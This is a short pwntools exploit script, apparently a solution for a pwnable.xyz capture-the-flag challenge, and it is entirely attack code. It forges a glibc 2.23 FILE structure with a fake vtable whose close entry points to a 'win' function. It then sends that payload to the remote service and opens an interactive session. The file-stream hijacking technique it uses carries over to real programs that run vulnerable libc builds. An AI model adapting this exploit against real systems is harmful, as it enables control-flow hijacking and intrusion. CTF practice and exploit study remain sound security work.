from pwn import *
from IO_FILE import *

###Addr
#  libc2.23
buf = 0x601260
win = 0x4007ec

###Exploit
r = remote('svc.pwnable.xyz',30018)

###Set IO_IS_FILEBUF flag and assign a pointer for fp->lock
IO_file = IO_FILE_plus(arch=64)
stream = IO_file.construct(flags=0x2000,lock=buf+0x200,vtable=buf+0x100)
IO_jmp = IO_jump_t(arch=64)
vtable = IO_jmp.construct(close=win)

payload = stream.ljust(0x100,b'\x00')+vtable
r.sendafter('> ',payload)

r.interactive()
